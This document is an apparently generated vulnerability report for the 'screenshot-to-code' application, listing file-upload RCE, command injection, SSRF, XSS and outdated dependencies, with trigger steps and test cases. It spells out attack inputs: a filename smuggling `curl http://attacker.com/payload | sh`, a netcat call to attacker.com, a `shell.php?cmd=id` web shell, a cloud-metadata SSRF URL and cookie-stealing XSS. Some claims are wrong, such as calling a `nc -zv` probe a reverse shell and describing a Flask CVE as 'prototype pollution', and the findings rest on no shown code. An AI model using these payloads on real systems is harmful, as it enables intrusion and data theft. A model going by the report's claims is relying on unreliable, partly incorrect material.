### Vulnerability List for `screenshot-to-code`

---

#### **1. Arbitrary File Upload Leading to Remote Code Execution (Critical)**
- **Description**:
  The application accepts image uploads but lacks server-side validation of file content. Attackers can upload files with executable extensions (e.g., `.php`, `.py`) disguised as images.
  - **Steps to Trigger**:
    1. Rename a malicious script (e.g., `exploit.php`) to `exploit.png`.
    2. Upload the file by bypassing client-side checks (e.g., using `curl` or Burp Suite).
    3. Access the uploaded file via its URL (e.g., `http://[APP]/static/uploads/exploit.php`).

- **Impact**:
  Full server compromise via arbitrary code execution.

- **Current Mitigations**:
  Client-side file type validation only (easily bypassed).

- **Missing Mitigations**:
  - Server-side validation using MIME type detection (e.g., `python-magic`).
  - Store files in a non-web-accessible directory with randomized filenames.

- **Preconditions**:
  - File upload functionality is enabled.
  - Server allows execution of non-image file types.

- **Security Test Case**:
  1. Upload a file named `shell.php` with image headers.
  2. Access `http://[APP]/static/uploads/shell.php?cmd=id` and observe command output.

#### **2. Command Injection in Image Processing (Critical)**
- **Description**:
  The application uses `subprocess.run` with `shell=True` to execute system commands (e.g., ImageMagick). User-controlled filenames or parameters are unsanitized.
  - **Steps to Trigger**:
    1. Upload an image with a filename like `image; curl http://attacker.com/payload | sh`.
    2. Trigger image processing (e.g., resizing).
    3. The server executes the injected command.

- **Impact**:
  Remote code execution via command injection.

- **Current Mitigations**:
  No sanitization of user input in command arguments.

- **Missing Mitigations**:
  - Use `shell=False` and parameterized commands (e.g., `["convert", input_file, output_file]`).
  - Sanitize filenames to remove special characters (e.g., `;`, `&`, `|`).

- **Preconditions**:
  - Image processing uses system commands.
  - Attacker controls input to the command.

- **Security Test Case**:
  1. Upload a file named `test; nc -zv attacker.com 4444`.
  2. Observe a reverse shell connection to `attacker.com`.

#### **3. Server-Side Request Forgery (SSRF) via Image URL Fetching (High)**
- **Description**:
  The application fetches images from arbitrary URLs, enabling attackers to probe internal network endpoints.
  - **Steps to Trigger**:
    1. Submit a URL like `http://169.254.169.254/latest/meta-data` (AWS metadata endpoint).
    2. The server fetches the URL, returning sensitive data.

- **Impact**:
  Exposure of cloud credentials, internal service data, or network reconnaissance.

- **Current Mitigations**:
  No validation of user-provided URLs.

- **Missing Mitigations**:
  - Blocklist internal IP ranges (RFC 1918, cloud metadata).
  - Restrict URL fetching to allowlisted domains.

- **Preconditions**:
  - Image input via URL is enabled.

- **Security Test Case**:
  1. Submit `http://localhost:8080/admin` as the image URL.
  2. Check if the server responds with internal admin page content.

---

#### **4. Cross-Site Scripting (XSS) in Generated HTML (High)**
- **Description**:
  The application generates HTML from user-provided images without sanitizing text elements. Attackers can embed scripts in labels or buttons.
  - **Steps to Trigger**:
    1. Create an image with text elements like `<img src=x onerror=alert(1)>`.
    2. Process the image and view the generated HTML.
    3. The script executes in the victimâ€™s browser.

- **Impact**:
  Session hijacking, phishing, or client-side compromise.

- **Current Mitigations**:
  No escaping of HTML entities in generated code.

- **Missing Mitigations**:
  - Sanitize generated HTML with libraries like `bleach`.
  - Use framework auto-escaping (e.g., Jinja2 `| safe` filter removal).

- **Preconditions**:
  - Generated HTML is rendered in a browser.

- **Security Test Case**:
  1. Generate HTML from an image containing `<script>alert(document.cookie)</script>`.
  2. Verify if the script executes upon page load.

---

#### **5. Insecure Dependency Versions (Medium)**
- **Description**:
  Outdated dependencies (e.g., `Flask`, `Pillow`, `requests`) with known vulnerabilities (e.g., CVE-2023-30861 in Flask prototype pollution).
  - **Impact**:
    Exploitation of unpatched CVEs leading to RCE, data leaks, or privilege escalation.

- **Current Mitigations**:
  No evidence of dependency scanning or updates.

- **Missing Mitigations**:
  - Update dependencies to patched versions.
  - Integrate automated CVE scanning (e.g., `safety`, `dependabot`).

- **Preconditions**:
  - Vulnerable dependencies are deployed in production.

- **Security Test Case**:
  1. Run `safety check -r requirements.txt`.
  2. Confirm presence of high-risk CVEs (e.g., `tensorflow` RCE vulnerabilities).

### Summary
The highest risks stem from **unrestricted file uploads** and **command injection**, enabling direct server compromise. **SSRF** and **XSS** flaws further expose sensitive data and client-side attacks. Immediate patching and input/output validation are critical.
